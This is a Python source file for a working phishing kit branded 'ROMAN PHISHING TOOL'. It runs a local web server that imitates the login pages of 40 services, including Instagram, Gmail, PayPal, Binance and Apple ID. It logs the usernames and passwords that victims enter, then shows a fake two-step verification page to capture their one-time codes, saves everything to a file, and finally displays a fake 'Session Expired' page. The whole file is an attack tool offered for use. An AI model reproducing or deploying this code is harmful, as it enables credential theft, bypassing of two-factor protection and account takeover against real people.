import http.server
import socketserver
import urllib.parse
import os
import time
import threading
from datetime import datetime

RESET="\033[0m"; BOLD="\033[1m"; GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; BLUE="\033[94m"; CYAN="\033[96m"; WHITE="\033[97m"; MAGENTA="\033[95m"

HOST = '127.0.0.1' 
PORT = 8095

PLATFORMS = {
    "1": {"name": "Instagram", "color": "#0095f6", "bg": "#fafafa", "text": "#262626"},
    "2": {"name": "Facebook", "color": "#1877f2", "bg": "#f0f2f5", "text": "#1c1e21"},
    "3": {"name": "TikTok", "color": "#fe2c55", "bg": "#000000", "text": "#ffffff"},
    "4": {"name": "Gmail", "color": "#1a73e8", "bg": "#ffffff", "text": "#202124"},
    "5": {"name": "Snapchat", "color": "#00a8ff", "bg": "#fffc00", "text": "#000000"},
    "6": {"name": "Twitter (X)", "color": "#1da1f2", "bg": "#ffffff", "text": "#14171a"},
    "7": {"name": "Telegram", "color": "#0088cc", "bg": "#e6ebee", "text": "#000000"},
    "8": {"name": "LinkedIn", "color": "#0077b5", "bg": "#f3f2ef", "text": "#000000"},
    "9": {"name": "Discord", "color": "#5865F2", "bg": "#36393f", "text": "#ffffff"},
    "10": {"name": "Reddit", "color": "#FF4500", "bg": "#ffffff", "text": "#1c1c1c"},
    "11": {"name": "Pinterest", "color": "#E60023", "bg": "#ffffff", "text": "#111111"},
    "12": {"name": "Spotify", "color": "#1DB954", "bg": "#121212", "text": "#ffffff"},
    "13": {"name": "Netflix", "color": "#E50914", "bg": "#141414", "text": "#ffffff"},
    "14": {"name": "Steam", "color": "#171a21", "bg": "#1b2838", "text": "#c7d5e0"},
    "15": {"name": "Microsoft", "color": "#00a4ef", "bg": "#ffffff", "text": "#000000"},
    "16": {"name": "Yahoo", "color": "#6001d2", "bg": "#ffffff", "text": "#000000"},
    "17": {"name": "PayPal", "color": "#00457C", "bg": "#ffffff", "text": "#000000"},
    "18": {"name": "Binance", "color": "#F0B90B", "bg": "#181a20", "text": "#ffffff"},
    "19": {"name": "PUBG", "color": "#f2a900", "bg": "#1a1a1a", "text": "#ffffff"},
    "20": {"name": "Free Fire", "color": "#ff0000", "bg": "#000000", "text": "#ffffff"},
    "21": {"name": "Twitch", "color": "#6441a5", "bg": "#18181b", "text": "#efeff1"},
    "22": {"name": "Roblox", "color": "#e2231a", "bg": "#f2f2f2", "text": "#000000"},
    "23": {"name": "Coinbase", "color": "#0052ff", "bg": "#ffffff", "text": "#000000"},
    "24": {"name": "Amazon", "color": "#FF9900", "bg": "#ffffff", "text": "#000000"},
    "25": {"name": "Apple ID", "color": "#555555", "bg": "#f5f5f7", "text": "#1d1d1f"},
    "26": {"name": "GitHub", "color": "#24292e", "bg": "#ffffff", "text": "#24292e"},
    "27": {"name": "Zoom", "color": "#2D8CFF", "bg": "#ffffff", "text": "#000000"},
    "28": {"name": "Tinder", "color": "#FE3C72", "bg": "#ffffff", "text": "#000000"},
    "29": {"name": "Uber", "color": "#000000", "bg": "#ffffff", "text": "#000000"},
    "30": {"name": "Dropbox", "color": "#0061FF", "bg": "#ffffff", "text": "#000000"},
    "31": {"name": "ProtonMail", "color": "#8B89CC", "bg": "#ffffff", "text": "#000000"},
    "32": {"name": "Quora", "color": "#B92B27", "bg": "#ffffff", "text": "#000000"},
    "33": {"name": "Tumblr", "color": "#35465c", "bg": "#ffffff", "text": "#000000"},
    "34": {"name": "Vimeo", "color": "#1ab7ea", "bg": "#ffffff", "text": "#000000"},
    "35": {"name": "WeChat", "color": "#07C160", "bg": "#f7f7f7", "text": "#000000"},
    "36": {"name": "Line", "color": "#00C300", "bg": "#ffffff", "text": "#000000"},
    "37": {"name": "VK", "color": "#4C75A3", "bg": "#ffffff", "text": "#000000"},
    "38": {"name": "Odnoklassniki", "color": "#ED812B", "bg": "#ffffff", "text": "#000000"},
    "39": {"name": "Canva", "color": "#00C4CC", "bg": "#ffffff", "text": "#000000"},
    "40": {"name": "Adobe", "color": "#FF0000", "bg": "#ffffff", "text": "#000000"},
}

def clear(): os.system("clear")

def show_banner():
    print(f"""{CYAN}{BOLD}
    ██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗
    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║
    ██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║
    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║
    ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
    {RED}       [ R O M A N   P H I S H I N G   T O O L ]{RESET}
    {YELLOW}══════════════════════════════════════════════════{RESET}
    {GREEN} WA: {WHITE}923037224620 {GREEN}| TG: {WHITE}@romanempire078{RESET}
    {YELLOW}══════════════════════════════════════════════════{RESET}
    """)

def save_data(platform, user, pwd, otp="N/A"):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = f"\n[{now}] PLATFORM: {platform}\nUSER: {user}\nPASS: {pwd}\nOTP : {otp}\n{'-'*50}"
    
    with open("captured_data.txt", "a") as f:
        f.write(data)
    
    print("\a") 
    print(f"\n\n{MAGENTA}{BOLD}  ╔══════════════════════════════════════════════════════════════╗")
    print(f"  ║                 🔥 NEW DATA CAPTURED 🔥                      ║")
    print(f"  ╠══════════════════════════════════════════════════════════════╣")
    print(f"  ║  {YELLOW}PLATFORM : {WHITE}{platform:<45} {MAGENTA}║")
    print(f"  ║  {YELLOW}USERNAME : {WHITE}{user:<45} {MAGENTA}║")
    print(f"  ║  {YELLOW}PASSWORD : {WHITE}{pwd:<45} {MAGENTA}║")
    print(f"  ║  {YELLOW}OTP CODE : {WHITE}{otp:<45} {MAGENTA}║")
    print(f"  ╚══════════════════════════════════════════════════════════════╝{RESET}\n")

def generate_login_page(p_id):
    p = PLATFORMS[p_id]
    return f"""
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{p['name']} - Log In</title>
    <style>
        body {{ background: {p['bg']}; color: {p['text']}; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .card {{ background: {p['bg']}; border: 1px solid rgba(128,128,128,0.3); padding: 40px; border-radius: 8px; text-align: center; width: 320px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }}
        h1 {{ color: {p['color']}; margin-bottom: 25px; font-size: 32px; }}
        input {{ width: 90%; padding: 14px; margin: 8px 0; border: 1px solid rgba(128,128,128,0.4); border-radius: 6px; background: transparent; color: {p['text']}; font-size: 15px; outline: none; }}
        input:focus {{ border-color: {p['color']}; }}
        button {{ width: 95%; padding: 12px; background: {p['color']}; color: white; border: none; border-radius: 6px; margin-top: 15px; font-weight: bold; font-size: 16px; cursor: pointer; }}
    </style></head>
    <body><div class="card">
        <h1>{p['name']}</h1>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="{p['name']}">
            <input type="hidden" name="p_id" value="{p_id}">
            <input type="text" name="username" placeholder="Email, phone, or username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div></body></html>"""

def generate_otp_page(p_id, u, p):
    plat = PLATFORMS[p_id]
    return f"""
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Two-Factor Authentication</title>
    <style>
        body {{ background: {plat['bg']}; color: {plat['text']}; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .card {{ background: {plat['bg']}; border: 1px solid rgba(128,128,128,0.3); padding: 40px; border-radius: 8px; text-align: center; width: 320px; }}
        h2 {{ margin-bottom: 10px; font-size: 20px; color: {plat['color']}; }}
        p {{ font-size: 13px; opacity: 0.8; margin-bottom: 20px; }}
        input {{ width: 90%; padding: 14px; margin: 8px 0; border: 1px solid rgba(128,128,128,0.4); border-radius: 6px; background: transparent; color: {plat['text']}; font-size: 15px; text-align: center; letter-spacing: 5px; }}
        button {{ width: 95%; padding: 12px; background: {plat['color']}; color: white; border: none; border-radius: 6px; margin-top: 15px; font-weight: bold; cursor: pointer; }}
    </style></head>
    <body><div class="card">
        <h2>2-Step Verification</h2>
        <p>Enter the 6-digit code sent to your device for {plat['name']}.</p>
        <form method="POST" action="/verify">
            <input type="hidden" name="platform" value="{plat['name']}">
            <input type="hidden" name="username" value="{u}">
            <input type="hidden" name="password" value="{p}">
            <input type="text" name="otp" placeholder="------" maxlength="6" required><br>
            <button type="submit">Verify & Login</button>
        </form>
    </div></body></html>"""

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            p_id = query.get('id', ['1'])[0]
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(generate_login_page(p_id).encode('utf-8'))
        except BrokenPipeError: pass

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed = urllib.parse.parse_qs(post_data)
            
            if self.path == '/login':
                p_name = parsed.get('platform', ['Unknown'])[0]
                p_id = parsed.get('p_id', ['1'])[0]
                user = parsed.get('username', [''])[0]
                pwd = parsed.get('password', [''])[0]
                save_data(p_name, user, pwd, "Waiting for OTP...")
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(generate_otp_page(p_id, user, pwd).encode('utf-8'))

            elif self.path == '/verify':
                p_name = parsed.get('platform', ['Unknown'])[0]
                user = parsed.get('username', [''])[0]
                pwd = parsed.get('password', [''])[0]
                otp = parsed.get('otp', [''])[0]
                save_data(p_name, user, pwd, otp)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                err_html = f"<html><body style='font-family:Arial;text-align:center;padding-top:50px;background:#fafafa;'><h2 style='color:#ed4956;'>Session Expired</h2><p>Please close this window and try logging in again.</p></body></html>"
                self.wfile.write(err_html.encode())
        except BrokenPipeError: pass

    def log_message(self, format, *args): pass

class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

def main():
    while True:
        clear()
        show_banner()
        
        print(f"{BLUE}{BOLD}    ┌────────────────────────────────────────────────────┐")
        print(f"    │                SELECT TARGET PLATFORM               │")
        print(f"    ├────────────────────────────────────────────────────┤")
        
        keys = list(PLATFORMS.keys())
        for i in range(0, len(keys), 2):
            k1 = keys[i]
            n1 = PLATFORMS[k1]['name']
            
            if i + 1 < len(keys):
                k2 = keys[i+1]
                n2 = PLATFORMS[k2]['name']
                print(f"    │ {WHITE}[{k1:>2}]{BLUE} {n1:<16} {WHITE}[{k2:>2}]{BLUE} {n2:<14} {BLUE}│")
            else:
                print(f"    │ {WHITE}[{k1:>2}]{BLUE} {n1:<16}                          {BLUE}│")
                
        print(f"    ├────────────────────────────────────────────────────┤")
        print(f"    │ {WHITE}[ 0]{RED}  Exit Tool                                      {BLUE}│")
        print(f"    └────────────────────────────────────────────────────┘{RESET}")
        
        choice = input(f"{GREEN}{BOLD}  └──► Select Platform [0-40]: {RESET}").strip()
        
        if choice == "0": break
        elif choice in PLATFORMS:
            clear()
            show_banner()
            print(f"\n{CYAN}{BOLD}=================================================={RESET}")
            print(f"{GREEN}{BOLD}  [+] PORTAL ACTIVE: {WHITE}http://127.0.0.1:8095/?id={choice}{RESET}")
            print(f"  [*] Target Selected: {PLATFORMS[choice]['name']}{RESET}")
            print(f"{CYAN}{BOLD}=================================================={RESET}")
            print(f"\n{YELLOW}[~] Awaiting connection... (Press CTRL+C to stop){RESET}\n")
            
            try:
                server = ThreadingServer((HOST, PORT), PhishHandler)
                server.serve_forever()
            except KeyboardInterrupt:
                print(f"\n{RED}[!] Server Stopped.{RESET}")
                time.sleep(1)
        else: time.sleep(0.5)

if __name__ == "__main__":
    main()
